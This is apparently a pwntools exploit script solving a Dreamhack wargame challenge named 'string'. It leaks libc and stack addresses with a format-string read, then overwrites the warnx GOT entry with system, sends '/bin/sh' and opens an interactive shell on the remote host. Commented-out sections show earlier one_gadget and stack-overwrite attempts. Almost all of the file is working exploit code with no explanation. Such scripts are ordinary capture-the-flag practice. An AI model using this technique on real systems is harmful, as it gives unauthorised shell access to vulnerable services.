#!/usr/bin/env python3

from pwn import *

exe = ELF("./string_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

#p = process()
p = remote('host1.dreamhack.games', 15224)
#gdb.attach(p,gdbscript='''
#           b*0x804881a
#           b*0x0804875D
#           b*0x08048778

#           ''')


p.sendlineafter(b'> ',b'1')
p.sendafter(b'Input: ',b'%71$p|%73$p')
p.sendlineafter(b'> ',b'2')

offset = 0x18637
p.recvuntil(b': ')
leak = int(p.recvuntil(b'|')[:-1],16)
rsp = int(p.recvline()[:-1],16) - 0x1ac
libc.address = leak - offset
log.info(f"leak rsp: {hex(rsp)}")
log.info(f'leak libc {hex(libc.address)}')

bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym.system
one_gadget = libc.address + 0x3a819
log.info(f"system: {hex(system)}")

package = {
        one_gadget & 0xffff: exe.got.printf,
        one_gadget >> 16 & 0xffff: exe.got.printf+2,
        }
write = {
    exe.got.warnx:system
}
payload = fmtstr_payload(5,write,write_size='short')

input()
p.sendlineafter(b'> ',b'1')
p.sendafter(b'Input: ',payload)
p.sendlineafter(b'> ',b'2')

p.sendlineafter(b'> ',b'1')
p.sendafter(b'Input: ',b'/bin/sh\x00')
p.sendlineafter(b'> ',b'2')

#package = {
#        0xdeadbeef & 0xffff: rsp+4,
#        0xdeadbeef >> 16 & 0xffff: rsp+6,
#}
#log.info(f"one_gadget: {hex(one_gadget)}")
#package_sorted = sorted(package)

#payload = f"%{package_sorted[0]}c%20$hn".encode()
#payload += f"%{package_sorted[1]-package_sorted[0]}c%21$hn".encode()
#payload = payload.ljust(60,b'a')
#payload +=  flat(
#        package[package_sorted[0]],
##        package[package_sorted[1]],
 #       )
#input()
#p.sendlineafter(b'> ',b'1')
#p.sendafter(b'Input: ',payload)
#p.sendlineafter(b'> ',b'2')
#input()
#bin_sh = next(libc.search(b'/bin/sh\x00'))
#log.info(f"bin_sh: {hex(bin_sh)}")
#package = {
#        system & 0xffff: rsp,
#        system >> 16 & 0xffff: rsp+2,
#}
#log.info(f"one_gadget: {hex(one_gadget)}")
#package_sorted = sorted(package)

#payload = f"%{package_sorted[0]}c%20$hn".encode()
#payload += f"%{package_sorted[1]-package_sorted[0]}c%21$hn".encode()
#payload = payload.ljust(60,b'a')
#payload +=  flat(
#        package[package_sorted[0]],
#        package[package_sorted[1]],
#        )
#input()
#p.sendlineafter(b'> ',b'1')
#p.sendafter(b'Input: ',payload)
#p.sendlineafter(b'> ',b'2')

p.interactive()
